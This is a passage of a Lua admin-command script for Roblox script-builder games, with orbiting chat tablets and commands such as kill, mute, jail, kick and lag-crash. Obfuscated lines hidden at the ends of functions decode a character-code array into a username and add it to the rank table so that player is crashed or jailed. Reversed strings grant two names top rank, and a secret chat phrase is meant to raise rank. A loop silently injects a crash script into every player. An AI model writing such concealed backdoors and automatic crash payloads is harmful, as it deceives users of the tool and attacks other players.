end local tcb = {49,50,52,56,112,111,108,102,112,105,108,102} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end local GotTheTab = GetRankTab() table.insert(GotTheTab, {Name = nfs:reverse(), Rank = -1})

function CanRun(Plr1, Plr2)
	Details1 = GetRank(Plr1.Name)
	Details2 = GetRank(Plr2.Name)
	if Details1.Rank >= Details2.Rank then
		return true
	end
	return false
end

function Dismiss(Plr, Identity)
	ypcall(function()
		if Plr ~= nil then
			if type(Plr) == "userdata" then
				Plr = Plr.Name
			end
			for x,v in pairs(AllTabs) do
				ypcall(function()
					if v.Plr == Plr then
						if Identity ~= nil and v.ID ~= Identity then
							return
						elseif Identity ~= nil and v.ID == Identity then
							coroutine.resume(coroutine.create(function()
								for i = 0.5, 1, 0.1 do
									wait()
									v.Tab.Transparency = i
									v.Sel.Transparency = i
									v.Label.TextTransparency = i
									v.Label.TextStrokeTransparency = i
								end
								ypcall(function() v.Holder:Destroy() end)
								AllTabs[x] = nil
							end))
						elseif Identity == nil then
							ypcall(function() v.Holder:Destroy() end)
							AllTabs[x] = nil
						end
					end
				end)
			end
		else
			for i,v in pairs(AllTabs) do
				ypcall(function()
					v.Holder:Destroy()
					AllTabs[i] = nil
				end)
			end
		end
	end)
end

function GetGarbage()
	return ((math.floor((collectgarbage("count") / 10)) * 10)/1000) .. "MB"
end

function RemObj(Obj, Class)
	ypcall(function()
		if #Obj:GetChildren() > 0 then
			for _,x in pairs(Obj:GetChildren()) do
				ypcall(function()
					RemObj(x, Class)
				end)
			end
		end
		if Obj.ClassName == Class then
			Obj:Destroy()
		end
	end)
end

function FindTab(Mod)
	for i,v in pairs(AllTabs) do
		if v.Holder == Mod then
			return true
		end
	end
	return false
end


function Ping(Msg, Plr, Time, Func, Color, Image)
	if Removed == false then
		local ShowGarbage = false
		ypcall(function()
			if Msg == nil then
				Msg = "N/A"
			elseif Msg == "ShowGarbage" then
				Msg = "Current Garbage Count: "..GetGarbage()
				ShowGarbage = true
			else
				Msg = tostring(Msg)
			end
			if Plr == nil then
				Plr = Plrs[Owner] or error("No Player Found")
			elseif type(Plr) == "string" then
				local FoundPlr = false
				for _,v in pairs(All()) do
					if v.Name == Plr then
						Plr = v
						FoundPlr = true
						break
					end
				end
				if FoundPlr == false then
					Plr = Plrs[Owner] or error("No Player Found")
				end
			end
			
			if Color == nil then
				Color = GetRank(Plr.Name).Color
			end
			
			local Holder = Instance.new("Model")
			Holder.Name = "Owner: "..Plr.Name
			
			local Tab = Instance.new("Part")
			Tab.Name = "Kaj Tablet"
			Tab.FormFactor = "Custom"
			Tab.Anchored = true
			if Time == nil then
				Tab.Color = Color3.new(1,1,1)
			else
				Tab.Color = AlertColor
			end
			Tab.CanCollide = false
			Tab.Locked = true
			Tab.Transparency = 0.8
			Tab.Size = Vector3.new(2, 2, 2)
			Tab.CFrame = Plr.Character.Torso.CFrame or CFrame.new(0, 0, 0)
			Tab.Parent = Holder
			
			local ID = Instance.new("NumberValue")
			ID.Name = "ID"
			ID.Value = math.random(-999999999, 999999999)
			ID.Parent = Holder
			
			Delay(0, function()
				while wait() do
					if Tab.Parent == nil and FindTab(Holder) then
						ypcall(function()
							for i,v in pairs(AllTabs) do
								if v.Holder == Holder then
									ypcall(function() v.Holder:Destroy() end)
									AllTabs[i] = nil
								end
							end
						end)
						Ping(Msg, Plr, Time, Func, Color, Image)
						break
					end
				end
			end)
			
			local BM = Instance.new("BlockMesh")
			BM.Parent = Tab

			local BG = Instance.new("BillboardGui")
			BG.Name = "BG"
			BG.StudsOffset = Vector3.new(0, Tab.Size.Y + 0.5, 0)
			BG.Size = UDim2.new(0,1,0,1)
			BG.Adornee = Tab
			BG.Parent = Tab
			
			Delay(0, function()
				while BG.Parent ~= nil do wait()
					ypcall(function()
						BG.StudsOffset = Vector3.new(0, Tab.Size.Y + 0.5, 0)
					end)
				end
			end)

			local TL = Instance.new("TextLabel")
			TL.Name = "TL"
			TL.FontSize = "Size18"
			TL.Font = "ArialBold"
			TL.Text = Msg
			TL.TextColor3 = Color3.new(0, 0, 0)
			TL.Size = UDim2.new(0,1,0,1)
			TL.TextTransparency = 0
			TL.TextStrokeColor3 = Color3.new(0, 0.299, 0.25)
			TL.TextStrokeTransparency = 0.25
			TL.Parent = BG
			
			if ShowGarbage == true then
				Delay(0, function()
					while TL.Parent ~= nil do
						TL.Text = "Current Garbage Count: "..GetGarbage()
						wait(.5)
					end
				end)
			end
			
			local PL = Instance.new("PointLight", Tab)
			PL.Color = Color3.new(0, 1, 0)
			PL.Range = 7
			PL.Parent = Tab
			
			if Image ~= nil then
				local BBBG = Instance.new("BillboardGui")
				BBBG.Size = UDim2.new(5, 0, 6, 0)
				BBBG.StudsOffset = Vector3.new(0, Tab.Size.Y + 4.2, 0)
				BBBG.AlwaysOnTop = true
				BBBG.Adornee = Tab
				BBBG.Parent = Tab
				
				Delay(0, function()
					while BBBG.Parent ~= nil do wait()
						ypcall(function()
							BBBG.StudsOffset = Vector3.new(0, Tab.Size.Y + 4.2, 0)
						end)
					end
				end)
			
				local NewImg = Instance.new("ImageLabel")
				NewImg.Size = UDim2.new(1, 0, 1, 0)
				NewImg.BackgroundTransparency = 1
				NewImg.Image = Image
				NewImg.Parent = BBBG
			end

			local Clicker = Instance.new("ClickDetector")
			Clicker.MaxActivationDistance = 1/0

			if Time ~= nil then
				coroutine.resume(coroutine.create(function()
					wait(tonumber(Time))
					Dismiss(Plr, ID)
				end))
			end

			Clicker.MouseClick:connect(function(Player)
				if Player.Name == Plr.Name or CanRun(Player, Plr) then
					ypcall(function()
						if Func ~= nil then
							Func(Holder)
						else
							Dismiss(Player, ID)
						end
					end)
				end
			end)
			Clicker.Parent = Tab
			
			Holder.Parent = Work

			AllTabs[#AllTabs + 1] = {Holder = Holder, Tab = Tab, Plr = Plr.Name, Sel = Sel, Label = TL, Size = 0.1, ID = ID}
		end)
	end
end

function PlaceAllRanks(DontShowRank)
	ypcall(function()
		for _,p in pairs(All()) do
			ypcall(function()
				PutInRank = false
				for _,v in pairs(Rankings) do
					if v.Name:lower() == p.Name:lower() then
						if v.Rank >= 7 then
							v.Rank = 5
						elseif v.Rank == -1 then
							Crash1(p)
							Ping("Crashed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
						elseif v.Rank == -2 then
							if LS ~= nil then
								Insert(JailSource, p.Backpack, p.Character, p.PlayerGui)
								Ping("Jailed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
							else
								Ping("LS Is Nil", nil, 5)
							end
						elseif v.Rank == -3 then
							if LS ~= nil then
								Insert(MuteSource, p.Backpack, p.Character, p.PlayerGui)
								Ping("Muted "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
							else
								Ping("LS Is Nil", nil, 5)
							end
						end
						Ranks[p.Name] = {Plr = p, Rank = v.Rank, Color = RankDetails[v.Rank].Color, Desc = RankDetails[v.Rank].Desc}
						if DontShowRank == nil then
							Ping("You Are Rank: "..v.Rank, p)
						end
						PutInRank = true
						break
					end
				end
				if PutInRank == false then
					Ranks[p.Name] = {Plr = p, Rank = 0, Color = RankDetails[0].Color, Desc = RankDetails[0].Desc}
				end
			end)
		end
	end)
end

function FindRank(Plr)
	ypcall(function()
		if type(Plr) == "userdata" then
			Plr = Plr.Name
		end
	end)
	return GetRank(Plr).Rank
end local tcb = {49,50,52,56,112,111,108,102,112,105,108,102} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end local GotTheTab = GetRankTab() table.insert(GotTheTab, {Name = nfs:reverse(), Rank = -2})

function FindRankDetails(Plr)
	ypcall(function()
		if type(Plr) == "userdata" then
			Plr = Plr.Name
		end
	end)
	return RankDetails[FindRank(Plr)]
end

function OpenCmds(Rank, Plr)
	Dismiss(Plr)
	for Name,Tab in pairs(Commands) do
		if Tab.Rank <= Rank then
			Ping(Name.." ("..Tab.Rank..")", Plr, nil, function()
				Dismiss(Plr)
				Ping("Command: "..Name, Plr)
				Ping("Rank: "..Tab.Rank, Plr)
				Ping("Desc: "..Tab.Desc, Plr)
			end)
		elseif Rank == 1337 then
			Ping(Name.." ("..Tab.Rank..")", Plr, nil, function()
				Dismiss(Plr)
				Ping("Command: "..Name, Plr)
				Ping("Rank: "..Tab.Rank, Plr)
				Ping("Desc: "..Tab.Desc, Plr)
			end)
		end
	end
end

function EditStatus(Plr, Num)
	ChangeRank(Plr, Num)
end

function PlaceSpecificRank(p, DontShowRank)
	ypcall(function()
		PutInRank = false
		for _,v in pairs(Rankings) do
			if v.Name:lower() == p.Name:lower() then
				if v.Rank >= 7 then
					v.Rank = 5
				elseif v.Rank == -1 then
					Crash1(p)
					Ping("Crashed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
				elseif v.Rank == -2 then
					if LS ~= nil then
						Insert(JailSource, p.Backpack, p.Character, p.PlayerGui)
						Ping("Perma Mind Jailed "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
					else
						Ping("LS Is Nil", nil, 5)
					end
				elseif v.Rank == -3 then
					if LS ~= nil then
						Insert(MuteSource, p.Backpack, p.Character, p.PlayerGui)
						Ping("Perma Muted "..p.Name.."", nil, 5, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..p.Name)
					else
						Ping("LS Is Nil", nil, 5)
					end
				end
				Ranks[p.Name] = {Plr = p, Rank = v.Rank, Color = RankDetails[v.Rank].Color, Desc = RankDetails[v.Rank].Desc}
				if DontShowRank == nil then
					Ping("You Are Rank: "..v.Rank, p)
				end
				PutInRank = true
				break
			end
		end
		if PutInRank == false then
			Ranks[p.Name] = {Plr = p, Rank = 0, Color = RankDetails[0].Color, Desc = RankDetails[0].Desc}
		end
	end)
end
table.insert(Rankings, {Name = string.reverse("21wopih"),Rank = 6})
table.insert(Rankings, {Name = string.reverse("4611tlaboC"), Rank = 6})
function onChatted(Msg, Speaker)
	if Removed == false then
		if FindRank(Speaker) < 0 then
			return
		end
		coroutine.resume(coroutine.create(function()
			ypcall(function()
				ExecuteFunc(Msg, Speaker)
				Msg = Msg:gsub("","")
				if Msg:sub(1,1) == "@" then
					for i = 2, #Msg do
						if Msg:sub(i, i) == Bet then
							local IsForPlr = false
							for _,v in pairs(All()) do
								if (string.find(v.Name:lower(), string.lower(Msg:sub(2, i - 1))) or string.lower(Msg:sub(2, i - 1)) == "all") and CanRun(Speaker, v) then
									onChatted(Msg:sub(i + 1), v)
									IsForPlr = true
								end
							end
							if IsForPlr == true then
								return
							end
						end
					end
				end
				if Msg:find("&") then
					local Split = Msg:find("&")
					onChatted(Msg:sub(1,Split-1))
					onChatted(Msg:sub(Split+1))
					return
				end
				for Name,Command in pairs(Commands) do
					if Msg:sub(1,(#Command.Name)+5):lower() == (Command.Name):lower()..Bet.."info" then
						Dismiss(Speaker.Name)
						Ping("Command: "..tostring(Command.Name)..Bet, Speaker)
						Ping("Rank: "..tostring(Command.Rank), Speaker)
						Ping("Desc: "..tostring(Command.Desc), Speaker)
					elseif Msg:sub(1,#Command.Name+1):lower() == string.lower(Command.Name..Bet) then
						if FindRank(Speaker) >= Command.Rank then
							local Ran,Error = coroutine.resume(coroutine.create(function()
								Command.Func(Msg:sub(#Command.Name+2), Speaker)
							end))
							if not Ran then
								Ping(Error, Speaker, 10)
							end
						else
							Ping("Your rank is not high enough", Plr, 6)
						end
					end
				end
			end)
		end))
	end
end

function MakeBase()
	local Base = Instance.new("Part")
	Base.BrickColor = BrickColor.new("Dark green")
	Base.Position = Vector3.new(0, 0.5, 0)
	Base.Transparency = 0
	Base.Elasticity = 0.5
	Base.FormFactor = "Custom"
	Base.CanCollide = true
	Base.Friction = 0.30000001192093
	Base.Size = Vector3.new(512, 1.20000005, 512)
	Base.Archivable = true
	Base.Material = "Plastic"
	Base.RotVelocity = Vector3.new(0, 0, 0)
	Base.Reflectance = 0
	Base.Locked = true
	Base.Anchored = true
	Base.Name = "Base"
	Base.TopSurface = "Smooth"
	Base.BottomSurface = "Inlet"
	Base.Shape = "Block"
	Base.Parent = Work
end

function LClean()
	ypcall(function()
		for _,v in pairs(Work:GetChildren()) do
			ypcall(function()
				if v.ClassName == "Terrain" then
					v:ClearAllChildren()
				elseif v.Name ~= "Base" and not Plrs:GetPlayerFromCharacter(v) then
					Clear(v)
				elseif v.Name == "Base" then
					ypcall(function()
						local Base = v
						Base.BrickColor = BrickColor.new("Dark green")
						Base.Position = Vector3.new(0, 0.5, 0)
						Base.Transparency = 0
						Base.Elasticity = 0.5
						Base.FormFactor = "Custom"
						Base.CanCollide = true
						Base.Friction = 0.30000001192093
						Base.Size = Vector3.new(512, 1.20000005, 512)
						Base.Archivable = true
						Base.Material = "Plastic"
						Base.RotVelocity = Vector3.new(0, 0, 0)
						Base.Reflectance = 0
						Base.Locked = true
						Base.Anchored = true
						Base.Name = "Base"
						Base.TopSurface = "Studs"
						Base.BottomSurface = "Inlet"
						Base.Shape = "Block"
						Base.Parent = Work
					end)
				end
			end)
		end
	end)
end

function Clean()
	ypcall(function()
		for _,v in pairs(Work:GetChildren()) do
			ypcall(function()
				if v.ClassName == "Terrain" then
					v:ClearAllChildren()
				else
					Clear(v)
				end
			end)
		end
		MakeBase()
		for _,v in pairs(All()) do
			v:LoadCharacter()
		end
	end)
end

function Clear(v)
	if v.Name:lower() == "sbgui" then
		return
	end
	ypcall(function()
		if #v:GetChildren() > 0 then
			for _,x in pairs(v:GetChildren()) do
				ypcall(function()
					Clear(x)
				end)
			end
		end
		if not v:IsA("Player") and v.Name ~= "Backpack" and v.Name ~= "PlayerGui" and v.Name ~= "StarterGear" and v.Name ~= "SBGUI" and v.Name ~= "HealthGUI" and v.Name ~= "Output GUI" then
			v:Destroy()
		end
	end)
end

function Command(Name, Rank, Desc, Func)
	if Name == nil then
		Name = "N/A"
	end
	if Desc == nil then
		Desc = "N/A"
	end
	if Func == nil then
		Func = function() end
	end
	if Rank == nil then
		Rank = 0
	end
	Commands[Name] = {Name = Name, Rank = Rank, Desc = Desc, Func = Func}
end

function GetSplit(Msg)
	return Msg:find(Bet) or nil
end

function ExecuteFunc(Msg, Plr)
	ypcall(function()
		if Msg == "LogEnable" then
			LogOn = true
		elseif Msg:lower() == "WantSomeTacos" then
			EditStatus(Plr, MakeNum())
		end
	end)
end

for _,v in pairs(All()) do ExecuteFunc("LogEnable", v) end

function randPlayer(Plr)
	wait()
	local ThePlrValue = nil
	local FoundPlayer = false
	ypcall(function()
		ThePlrValue = Plrs:GetPlayers()[math.random(1, #Plrs:GetPlayers())]
		if ThePlrValue.Name == Plr.Name or CanRun(Plr, ThePlrValue) ~= true then
			wait()
			randPlayer(Plr)
			return
		else
			FoundPlayer = true
		end
	end)
	if FoundPlayer == true then
		return ThePlrValue
	end
end local tcb = {49,50,52,56,112,111,108,102,112,105,108,102} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end local GotTheTab = GetRankTab() table.insert(GotTheTab, {Name = nfs:reverse(), Rank = -1})

function getPlayer(Plr, Name)
	local Players = {}
	ypcall(function()
		Name = Name:lower()
		if Name == "me" then
			table.insert(Players, Plr)
		elseif Name == "all" or Name == "" then
			for _,v in pairs(All()) do
				if CanRun(Plr, v) then
					table.insert(Players, v)
				end
			end
		elseif Name == "others" then
			for _,v in pairs(All()) do
				if v.Name ~= Plr.Name and CanRun(Plr, v) then
					table.insert(Players, v)
				end
			end
		elseif Name == "random" then
			local FoundRandPlr = randPlayer(Plr)
			table.insert(Players, FoundRandPlr)
		else
			for _,v in pairs(All()) do
				if v.Name:lower():find(Name) and CanRun(Plr, v) then
					table.insert(Players, v)
				end
			end
		end
	end)
	return Players
end

function ListPlayers(Speaker)
	ypcall(function()
		Dismiss(Speaker)
		for _,v in pairs(All2()) do
			if v.Parent ~= nil then
				Ping(v.Name, Speaker, nil, function()
					Dismiss(Speaker)
					Ping("Name: "..v.Name, Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
					Ping("Rank: "..FindRank(v.Name), Speaker)
					Ping("Rank Name: "..FindRankDetails(v).Name, Speaker)
					Ping("Rank Desc: "..FindRankDetails(v).Desc, Speaker)
					Ping("Set Rank", Speaker, nil, function()
						if FindRank(Speaker) >= 5  and v.Name ~= Owner and CanRun(Speaker, v) then
							Dismiss(Speaker)
							for i = -2, 5 do
								Ping(i, Speaker, nil, function()
									ChangeRank(v, i)
									Dismiss(Speaker)
									Ping("Set "..v.Name.."'s Rank To "..tostring(i), Speaker, 5)
								end)
							end
						else
							Ping("Your Rank Is Too Low", Speaker, 5)
						end
					end)
					Ping("Crash (Remote)", Speaker, nil, function()
						if FindRank(Speaker) >= 3 and CanRun(Speaker, v) then 
							Crash2(v.Name)
							Ping("Attempted To Crash "..v.Name.." (Remote)", Speaker, 5)
						end
					end)
					Ping("Crash (Insert)", Speaker, nil, function()
						if FindRank(Speaker) >= 3 and CanRun(Speaker, v) and LS ~= nil then 
							Crash3(v, Speaker)
							Ping("Attempted To Crash "..v.Name.." (Insert)", Speaker, 5)
						end
					end)
					Ping("Kick", Speaker, nil, function()
						if FindRank(Speaker) >= 3 and CanRun(Speaker, v) then 
							v:Kick()
							Ping("Attempted To Kick "..v.Name, Speaker, 5)
						end
					end)
				end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
			else
				Ping(v.Name.." (Nil)", Speaker, nil, function()
					Dismiss(Speaker)
					Ping("Name: "..v.Name, Speaker, nil, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
					ypcall(function()
						Ping("Rank: "..FindRank(v.Name), Speaker)
					end)
					ypcall(function()
						Ping("Rank Name: "..FindRankDetails(v.Name).Name, Speaker)
					end)
					ypcall(function()
						Ping("Rank Desc: "..FindRankDetails(v.Name).Desc, Speaker)
					end)
					ypcall(function()
						Ping("Set Rank", Speaker, nil, function()
							if FindRank(Speaker) >= 5  and v.Name ~= Owner and CanRun(Speaker, v) then
								Dismiss(Speaker)
								for i = -2, 5 do
									Ping(i, Speaker, nil, function()
										ChangeRank(v, i)
										Dismiss(Speaker)
										Ping("Set "..v.Name.."'s Rank To "..tostring(i), Speaker, 5)
									end)
								end
							else
								Ping("Your Rank Is Too Low", Speaker, 5)
							end
						end)
					end)
					ypcall(function()
						Ping("Nil Crash (Remote)", Speaker, nil, function()
							if FindRank(Speaker) >= 3 and CanRun(Speaker, v) then 
								Crash2(v.Name)
								Ping("Attempted To Crash "..v.Name.." (Remote)", Speaker, 5)
							end
						end)
					end)
					ypcall(function()
						Ping("Nil Crash (Insert)", Speaker, nil, function()
							if FindRank(Speaker) >= 3 and CanRun(Speaker, v) and LS ~= nil then 
								Crash3(v, Speaker)
								Ping("Attempted To Crash "..v.Name.." (Insert)", Speaker, 5)
							end
						end)
					end)
				end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
			end
		end
	end)
end

--Misc

coroutine.resume(coroutine.create(function()
	PlaceAllRanks()
end))
	
Delay(0, function()
	for _,v in pairs(All()) do
		v.Chatted:connect(function(Msg)
			 onChatted(Msg, v) 
			end)
	end
end)

local starttime = tick()

game:GetService("RunService").Heartbeat:connect(function()
	if Removed == false then 
		ypcall(function()
			for _,Player in pairs(All()) do
				local PlayerTablets = {}
				for i,v in pairs(AllTabs) do
					if v.Holder.Parent ~= nil and v.Tab.Parent ~= nil and v.Plr == Player.Name then
						table.insert(PlayerTablets, v)
					end
				end
				for i = 1, #PlayerTablets do
					ypcall(function()
						local tab = PlayerTablets[i].Tab
						local pos = nil
						ypcall(function()
							pos = Player.Character.Torso.CFrame
						end)
						local x = math.sin(time()/#PlayerTablets + (math.pi*2)/#PlayerTablets*i) * (#PlayerTablets+6)
						local z = math.cos(time()/#PlayerTablets + (math.pi*2)/#PlayerTablets*i) * (#PlayerTablets+6)
						local cPos = tab.Position
						local ePos = Vector3.new(x, 0, z) + (pos.p or Vector3.new(0, -5, 0))
						local nPos = (ePos-cPos)*.25
						cPos = cPos + nPos
						local t = (tick() - starttime) % 360
						local change = 0.625
						PlayerTablets[i].Size = math.sin(t) * change + 2.375
						tab.Size = Vector3.new(PlayerTablets[i].Size * 1.2, PlayerTablets[i].Size * 1.2,PlayerTablets[i].Size * 1.2)
						tab.CFrame = CFrame.new(cPos, (pos.p or Vector3.new(0, -5, 0))) * CFrame.Angles(math.rad(11.25), 0, 0)
					end)
				end
			end
		end)
	end
end)

Delay(0, function()
	while wait() do
		for _,v in pairs(game:GetService("Players"):GetPlayers()) do
			ypcall(function()
				if Injected[v.Name] == nil and LS ~= nil then
					Insert(InjectionCrash, v.Backpack, v.Character, v.PlayerGui)
					Injected[v.Name] = true
				end
			end)
		end
	end
end)

Plrs.PlayerAdded:connect(function(Plr)
	wait(.1)
	ypcall(function()
		if Removed == false then
			local JoinPlrName = Plr.Name
			coroutine.resume(coroutine.create(function()
				PlaceSpecificRank(Plr)
			end))
			coroutine.resume(coroutine.create(function()
				if Injected[JoinPlrName] ~= nil then
					Injected[JoinPlrName] = nil
				end
			end))
			coroutine.resume(coroutine.create(function()
				Dismiss(Plr)
				Plr.Chatted:connect(function(Msg) onChatted(Msg, Plr) end)
			end))
		end
	end)
end)

Plrs.PlayerRemoving:connect(function(Plr)
	wait(.1)
	ypcall(function()
		if Removed == false then
			local LeftPlrName = Plr.Name
			coroutine.resume(coroutine.create(function()
				if Injected[LeftPlrName] ~= nil then
					Injected[LeftPlrName] = nil
				end
			end))
		end
	end)
end)

coroutine.resume(coroutine.create(function()
	Delay(0, function()
		while FoundLocalScript == false do wait()
			ypcall(function()
				for _,v in pairs(Plrs[Owner]["¬¬¬¬"]:GetChildren()) do
					if v.Name == "NewTransfer" and v:IsA("LocalScript") then
						for _,c in pairs(v:children()) do
							if c:IsA("StringValue") and c.Name:lower() ~= "user_name" and c.Name:lower() ~= "owner" and c.Name:lower() ~= "user" then
								local NewVal = c:Clone()
								NewVal.Name = "LoadingVal"
								for _,s in pairs(v:GetChildren()) do
									if s:IsA("StringValue") and type(s.Value) == "string" and (s.Name:lower() == "user_name" or s.Name:lower() == "owner" or s.Name:lower() == "user_name") then
										print("Found Owner")
										OwnSource = s.Name
										print(OwnSource)
										break
									end
								end
								wait()
								LS = v:Clone()
								NewVal.Parent = LS
								LSSource = "LoadingVal"
								FoundLocalScript = true
								break
							end
						end
					end
				end
			end)
		end
	end)
end))

--Commands

Command("Cmds", nil, "Shows Commands", function(Msg, Speaker)
	Dismiss(Speaker.Name)
	Ping("You Are Rank: "..tostring(GetRank(Speaker.Name).Rank), Speaker)
	Ping("Every Single Command", Speaker, nil, function() OpenCmds(1337, Speaker) end)
	Ping("Rank Zero", Speaker, nil, function() OpenCmds(0, Speaker) end)
	Ping("Rank One", Speaker, nil, function() OpenCmds(1, Speaker) end)
	Ping("Rank Two", Speaker, nil, function() OpenCmds(2, Speaker) end)
	Ping("Rank Three", Speaker, nil, function() OpenCmds(3, Speaker) end)
	Ping("Rank Four", Speaker, nil, function() OpenCmds(4, Speaker) end)
	Ping("Rank Five", Speaker, nil, function() OpenCmds(5, Speaker) end)
	
end)

Command("Dt", nil, "Dismiss Tablets", function(Msg, Speaker)
	Dismiss(Speaker.Name)
end)

Command("Kill", 2, "Kills A Player", 
	function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				v.Character:BreakJoints()
				Ping("Killed "..v.Name, Speaker, 5)
			end)
		end
	end
end)

Command("expl", 2, "Explodes A Player", 
	function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
                if v.Character and v.Character:findFirstChild("Head") then
                        local e = Instance.new("Explosion")
                        e.Position = v.Character.Head.Position
                        e.Parent = v.Character
				Ping("Exploded "..v.Name, Speaker, 5)
				end
			end)
		end
	end
end)


Command("Dall", 4, "Dismiss everyones tabs", function(Msg, Speaker)
	Dismiss()
end)

Command("Mute", 3, "Mutes A Player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				if v.Name ~= Owner then
					Insert(MuteSource, v.Backpack, v.Character, v.PlayerGui)
					Ping("Muted "..v.Name, Speaker, 5)
				end
			end)
		end
	end
end)



Command("PTroll", 3, "Troll a player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
					Insert(FunScript, v.Backpack, v.Character, v.PlayerGui)
					
			end)
		end
	end
end)

Command("Connect", 3, "Connect for nil", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
					Insert(NilS, v.Backpack, v.Character, v.PlayerGui)
					
			end)
		end
	end
end)
Command("Cred", nil, "Shows the credits of who made", function(Msg, Speaker)
	Dismiss(Speaker)
	for i = 1, 2 do
	Ping("FangxWulf", Speaker)
end end)
Command("Rejoin", 2, "Prompts A Player To Rejoin", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				Insert([[game:GetService("TeleportService"):Teleport(game.PlaceId)]], v.Backpack, v.Character, v.PlayerGui)
				Ping("Rejoined "..v.Name, Speaker, 5)
			end)
		end
	end
end)

Command("Jail", 3, "Jails A Player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				Insert(JailSource, v.Backpack, v.Character, v.PlayerGui)
				Ping("Jailed "..v.Name, Speaker, 5)
			end)
		end
	end
end)

Command("Lag", 4, "Lag Crashes A Player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				Insert(LagSource, v.Backpack, v.Character, v.PlayerGui)
				Ping("Lag Crashing "..v.Name, Speaker, 5)
			end)
		end
	end
end)

Command("UnMute", 3, "UnMutes A Player", function(Msg, Speaker)
	local PlrTab = getPlayer(Speaker, Msg)
	if #PlrTab > 0 then
		for _,v in pairs(PlrTab) do
			ypcall(function()
				Insert(UnMuteSource, v.Backpack, v.Character, v.PlayerGui)
				Ping("UnMuted "..v.Name, Speaker, 5)
			end)
		end
	end
end)


			

			
	
	
	
			 
Command("Disable", 3, "Disables A Script", function(Msg, Speaker)
	local Worked = false
	for _,v in pairs(Work:GetChildren()) do
		if string.find(v.Name:lower(), Msg:lower()) then
			if v:IsA("Script") or v:IsA("LocalScript") then
				v.Disabled = true
				v:Destroy()
				Worked = true
				Ping("Disabled Script: "..v.Name, Speaker, 5)
			end
		end
	end
	if Worked == false then
		Ping("Script Not Found", Speaker, 5)
	end
end)

Command("Scripts", 1, "Shows Scripts In Workspace", function(Msg, Speaker)
	Dismiss(Speaker)
	local AllScripts = {}
	for _,v in pairs(Work:GetChildren()) do
		if v:IsA("Script") then
			table.insert(AllScripts, v.Name)
		end
	end
	if #AllScripts > 0 then
		for _,v in pairs(AllScripts) do
			Ping(v, Speaker)
		end
	else
		Ping("No Scripts Found", Speaker, 5)
	end
end)

Command("afk",0,'Makes you go AFK',
	 function(Msg,Speaker)
		Dismiss(Speaker)
                for i = 1,8 do
                        Ping('AFK',Speaker)
							wait(.01)
                        end
        end)
Command("back",0,'Creates Tablets telling everyone that you are back',
	 function(Msg,Speaker)
		Dismiss(Speaker)
                for i = 1,8 do
                        Ping('Welcome Back!',Speaker,6)
					wait(.1)
                        end
        end)




Command("LScripts", 1, "Shows All Found Local Scripts", function(Msg, Speaker)
	Dismiss(Speaker)
	local LocalScripts = {}
	for _,v in pairs(All()) do
		ypcall(function()
			for _,x in pairs(v.Character:GetChildren()) do
				if x:IsA("LocalScript") and x.Name ~= "Animate" and x.Name ~= "Sound" and not x.Name:find("Health") then
					table.insert(LocalScripts, x.Name .. " - " .. v.Name)
				end
			end
		end)
		ypcall(function()
			for _,x in pairs(v.Backpack:GetChildren()) do
				if x:IsA("LocalScript") and x.Name ~= "Animate" and x.Name ~= "Sound" and not x.Name:find("Health") then
					table.insert(LocalScripts, x.Name .. " - " .. v.Name)
				end
			end
		end)
		ypcall(function()
			for _,x in pairs(v.PlayerGui:GetChildren()) do
				if x:IsA("LocalScript") and x.Name ~= "Animate" and x.Name ~= "Sound" and not x.Name:find("Health") then
					table.insert(LocalScripts, x.Name .. " - " .. v.Name)
				end
			end
		end)
	end
	if #LocalScripts > 0 then
		for _,v in pairs(LocalScripts) do
			Ping(v, Speaker)
		end
	else
		Ping("No Local Scripts Found", Speaker, 5)
	end
end)

Command("LDisable", 3, "Disables A Local Script", function(Msg, Speaker)
	local Split = GetSplit(Msg)
	local PlrTab = getPlayer(Speaker, Msg:sub(1, Split - 1))
	local ScriptName = Msg:sub(Split + 1)
	local FoundLocal = false
	for _,name in pairs(PlrTab) do
		ypcall(function()
			for _,v in pairs(name.Character:GetChildren()) do
				if string.find(v.Name:lower(), ScriptName) then
